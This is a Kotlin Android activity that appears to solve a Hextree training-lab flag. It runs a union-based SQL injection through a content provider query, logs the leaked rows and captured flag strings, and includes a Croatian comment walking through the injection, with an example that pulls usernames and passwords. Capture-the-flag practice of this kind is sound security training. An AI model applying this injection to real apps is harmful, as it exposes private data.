package io.hextree.webviewintent

import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.navigation.findNavController
import androidx.navigation.ui.AppBarConfiguration
import androidx.navigation.ui.navigateUp
import androidx.navigation.ui.setupActionBarWithNavController
import com.google.android.material.snackbar.Snackbar
import io.hextree.webviewintent.databinding.ActivityFlag33Binding

class Flag33Activity : AppCompatActivity() {

    private lateinit var appBarConfiguration: AppBarConfiguration
    private lateinit var binding: ActivityFlag33Binding

    //we had to add data type to manifest, adding content worked because: dat=content://io.hextree.flag33_2/
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d("flag33Hijack", intent.toString())


        //cursor will have data like this, so the code from jadx checking for flag33 or flag32 is checking already available data
        /*
            _id = 1, name = flag30, value = HXT{query-provider-table-1vsd8}, visible = 1
             _id = 1, name = secret, value = This is a secret note, visible = null
             _id = 2, name = flag31, value = HXT{query-uri-matcher-sakj1}, visible = 1
             _id = 2, name = flag33, value = HXT{union-select-injection-1bs98}, visible = null
             _id = 3, name = flag32, value = HXT{sql-injection-in-provider-1gs82}, visible = 0
             */

        if (intent.data != null) {
            val cursor = contentResolver.query(
                intent.data!!,
                null, "1=1 union select *, null as visible from note",  //null, "name='flag33'",
                //null, null,
                null, null
            )


            /*
            znaci imamo problematicni komad koda (dynamic concat) je :

    String str3 = "visible=1" + (str != null ? " AND (" + str + ")" : "");

    koji kaže:

    ako je str == null, str3 je visible=1
    ako je str != null, dodaj AND (<user controllable input>)

    prmjeti ove zagrade, malo nam prave problem. prva stvar koju želiš postići je nekako terminirati hardcodani query i ubaciti nesto svoje. imamo ovako:

    select * from flag where visible = 1 AND (<user controllable input>)

    s obzirom da tu imas taj nesretni and, a nakon toga je user controllable, prvo moras injectati neki true value, obicno je to 1=1, pa bi onda imali:

    select * from flag where visible = 1 AND (1=1);

    to je prvi dio selecta koji nesto vraca. sada zelimo ovdje napraviti uniju tako da select vrati nesto sto je nama korisno:

    select * from flag where visible = 1 AND (1=1 union select username,password from users --);

    primjeti da ovdje dodajes znak za komentare -- kako bi odjebao sve desno od querya, a to je u ovom slucaju ta problematicna zatvorena zagrada, pa ce se tvoj injectani query izvrsiti
             */
            // dump Uri
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    val sb = StringBuilder()
                    for (i in 0 until cursor.columnCount) {
                        if (sb.length > 0) {
                            sb.append(", ")
                        }
                        sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i))
                    }
                    Log.d("flag", sb.toString())
                } while (cursor.moveToNext())
            }
        }


        binding = ActivityFlag33Binding.inflate(layoutInflater)
        setContentView(binding.root)

        setSupportActionBar(binding.toolbar)

        val navController = findNavController(R.id.nav_host_fragment_content_flag33)
        appBarConfiguration = AppBarConfiguration(navController.graph)
        setupActionBarWithNavController(navController, appBarConfiguration)

        binding.fab.setOnClickListener { view ->
            Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                .setAction("Action", null)
                .setAnchorView(R.id.fab).show()
        }
    }

    override fun onSupportNavigateUp(): Boolean {
        val navController = findNavController(R.id.nav_host_fragment_content_flag33)
        return navController.navigateUp(appBarConfiguration)
                || super.onSupportNavigateUp()
    }
}